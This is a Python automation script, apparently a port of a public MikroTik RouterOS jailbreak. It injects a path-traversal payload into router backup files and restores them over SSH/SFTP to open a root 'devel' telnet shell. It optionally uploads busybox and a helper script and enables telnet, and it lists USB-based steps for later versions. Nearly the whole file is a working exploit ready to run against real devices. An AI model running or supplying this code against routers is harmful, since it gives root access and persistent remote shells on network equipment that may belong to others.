#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""RouterOS jailbreak automation — mikrotik-tools exploit-backup/defconf port."""

from __future__ import annotations

import re
import socket
import struct
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

BACKUP_MAGIC = b"\x88\xAC\xA1\xB1"
JAILBREAK_PAYLOAD = (
    b"\x1E\x00\x00\x00\x2E\x2E\x2F\x2E\x2E\x2F\x2E\x2E\x2F"
    b"\x6E\x6F\x76\x61\x2F\x65\x74\x63\x2F\x64\x65\x76\x65\x6C\x2D"
    b"\x6C\x6F\x67\x69\x6E\x2F\x00\x00\x00\x00\x00\x00\x00\x00"
)

# RouterOS 2.9.8 – 6.41rc56 (exploit-backup)
BACKUP_JB_MIN = (2, 9, 8)
BACKUP_JB_MAX = (6, 41, 56)  # rc56 encoded as patch level 56

# RouterOS 6.41 – 6.44.3+ (exploit-defconf, USB)
DEFCONF_JB_MIN = (6, 41, 0)
DEFCONF_JB_MAX = (6, 44, 99)

SSH_LEGACY_OPTS = {
    "look_for_keys": False,
    "allow_agent": False,
    "disabled_algorithms": {"pubkeys": ["rsa-sha2-512", "rsa-sha2-256"]},
}


def _parse_version(ver_str: str) -> Tuple[Tuple[int, ...], Optional[int]]:
    """Return (major.minor.patch_tuple, rc_number or None)."""
    rc = None
    base = ver_str
    if "rc" in ver_str.lower():
        m = re.search(r"rc(\d+)", ver_str, re.I)
        rc = int(m.group(1)) if m else 99
        base = ver_str.split("rc")[0].split("RC")[0]
    parts = []
    for p in base.strip().split("."):
        try:
            parts.append(int(re.sub(r"[^0-9].*", "", p)))
        except ValueError:
            break
    while len(parts) < 3:
        parts.append(0)
    return tuple(parts[:3]), rc


def patch_backup_file(data: bytes) -> Optional[bytes]:
    """Inject devel-login path (exploit_b.py / exploit-backup)."""
    if len(data) < 8 or data[:4] != BACKUP_MAGIC:
        return None
    matchsize = struct.unpack("<I", data[4:8])[0]
    if matchsize != len(data):
        return None
    new_size = matchsize + len(JAILBREAK_PAYLOAD)
    return data[:4] + struct.pack("<I", new_size) + data[8:] + JAILBREAK_PAYLOAD


def version_in_backup_jailbreak_range(ver_str: str) -> bool:
    t, rc = _parse_version(ver_str)
    if t < BACKUP_JB_MIN:
        return False
    if t > (6, 41, 0):
        return t == (6, 41, 0) and rc is not None and rc <= 56
    if t == (6, 41, 0):
        return rc is None or rc <= 56
    return True


def version_in_defconf_jailbreak_range(ver_str: str) -> bool:
    t, _ = _parse_version(ver_str)
    return DEFCONF_JB_MIN <= t <= (6, 44, 3)


def _ssh_connect(host: str, user: str, password: str, timeout: int = 15):
    import paramiko

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # Legacy RouterOS SSH (pre-7.x) often needs old KEX
    try:
        client.connect(
            host, port=22, username=user, password=password,
            timeout=timeout, look_for_keys=False, allow_agent=False,
            banner_timeout=timeout,
        )
    except paramiko.SSHException:
        transport = paramiko.Transport((host, 22))
        transport.start_client(timeout=timeout)
        transport.get_security_options().key_types = ["ssh-rsa", "ssh-dss"]
        transport.connect(username=user, password=password)
        client._transport = transport
    return client


def _ssh_run(client, cmd: str, timeout: int = 30) -> str:
    _, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode("utf-8", errors="replace")
    err = stderr.read().decode("utf-8", errors="replace")
    return (out + err).strip()


def get_routeros_version_ssh(host: str, user: str, password: str, timeout: int = 15) -> Optional[str]:
    try:
        client = _ssh_connect(host, user, password, timeout)
        out = _ssh_run(client, "/system resource print", timeout)
        client.close()
        m = re.search(r"version:\s+(\S+)", out, re.I)
        return m.group(1) if m else None
    except Exception:
        return None


def run_backup_jailbreak(
    host: str,
    user: str = "admin",
    password: str = "",
    timeout: int = 20,
    install_busybox: bool = False,
    busybox_dir: Optional[str] = None,
) -> Dict[str, Any]:
    """Full SSH backup jailbreak (exploit-backup/exploit_full.sh flow)."""
    result: Dict[str, Any] = {
        "method": "backup_path_traversal",
        "host": host,
        "success": False,
    }
    try:
        import paramiko
    except ImportError:
        result["error"] = "paramiko required: pip install paramiko"
        return result

    ver = get_routeros_version_ssh(host, user, password, timeout)
    result["version"] = ver
    if ver and not version_in_backup_jailbreak_range(ver):
        result["error"] = f"Version {ver} outside backup jailbreak range (2.9.8–6.41rc56)"
        return result

    jb_id = f"jb_bf_{int(time.time())}.backup"
    local_path = Path("/tmp") / jb_id

    try:
        client = _ssh_connect(host, user, password, timeout)
        save_out = _ssh_run(client, f'/system backup save name="{jb_id}" dont-encrypt=yes')
        if "backup saved" not in save_out.lower():
            save_out = _ssh_run(client, f'/system backup save name="{jb_id}"')
        if "backup saved" not in save_out.lower():
            result["error"] = f"backup save failed: {save_out[:200]}"
            client.close()
            return result

        sftp = client.open_sftp()
        sftp.get(jb_id, str(local_path))
        sftp.close()
        client.close()

        raw = local_path.read_bytes()
        patched = patch_backup_file(raw)
        if not patched:
            result["error"] = "backup patch failed (wrong magic or encrypted backup)"
            return result
        local_path.write_bytes(patched)

        client = _ssh_connect(host, user, password, timeout)
        sftp = client.open_sftp()
        sftp.put(str(local_path), jb_id)
        sftp.close()

        load_out = _ssh_run(client, f'/system backup load name="{jb_id}" password=""')
        if "configuration restored" not in load_out.lower():
            load_out = _ssh_run(client, f'/system backup load name="{jb_id}"')
        client.close()

        if "configuration restored" not in load_out.lower():
            result["error"] = f"backup restore failed: {load_out[:200]}"
            return result

        result["success"] = True
        result["evidence"] = (
            "Jailbreak backup restored. Access Linux shell: "
            f"telnet {host} 23 — user devel, password = admin password. "
            "Device will reboot."
        )

        if install_busybox and busybox_dir:
            result["busybox"] = _post_jailbreak_busybox(
                host, user, password, password, busybox_dir, timeout,
            )
    except Exception as exc:
        result["error"] = str(exc)
    finally:
        if local_path.is_file():
            try:
                local_path.unlink()
            except OSError:
                pass
    return result


def _post_jailbreak_busybox(
    host: str, ssh_user: str, ssh_pass: str, devel_pass: str,
    busybox_dir: str, timeout: int,
) -> Dict[str, Any]:
    """Optional busybox upload after jailbreak (exploit_full.sh stage 2)."""
    out: Dict[str, Any] = {"installed": False}
    try:
        client = _ssh_connect(host, ssh_user, ssh_pass, timeout)
        arch_out = _ssh_run(client, "/system resource print")
        arch_m = re.search(r"architecture-name:\s+(\S+)", arch_out, re.I)
        arch = arch_m.group(1) if arch_m else "x86"
        bb = Path(busybox_dir) / f"busybox-{arch}"
        if not bb.is_file():
            out["error"] = f"no busybox for arch {arch}"
            client.close()
            return out
        sftp = client.open_sftp()
        sftp.put(str(bb), "/busybox_p")
        slave = Path(busybox_dir) / "slave.sh"
        if slave.is_file():
            sftp.put(str(slave), "slave.sh")
        sftp.close()
        _ssh_run(client, "/ip service set telnet disabled=no port=23")
        client.close()
        out["installed"] = True
        out["arch"] = arch
    except Exception as exc:
        out["error"] = str(exc)
    return out


def defconf_jailbreak_instructions(version: str = "") -> Dict[str, Any]:
    """Return exploit-defconf USB workflow (physical access required)."""
    return {
        "method": "defconf_usb_bind",
        "version_range": "6.41 – 6.44.3+",
        "requires": ["USB port on MikroTik hardware", "physical access", "magic USB image"],
        "steps": [
            "Run: scripts/mikrotik_jailbreak_usb.py --device /dev/sdX  (from exploit-defconf/make_usb.sh)",
            "Power off router, insert USB, boot router",
            "Run second_stage.sh when prompted (SSH admin credentials)",
            "Telnet devel:<admin_password> on port 23 after reboot",
        ],
        "reference": "https://github.com/0ki/mikrotik-tools/tree/master/exploit-defconf",
        "note": "Not applicable to CHR/cloud — requires USB hardware.",
        "version_ok": version_in_defconf_jailbreak_range(version) if version else None,
    }
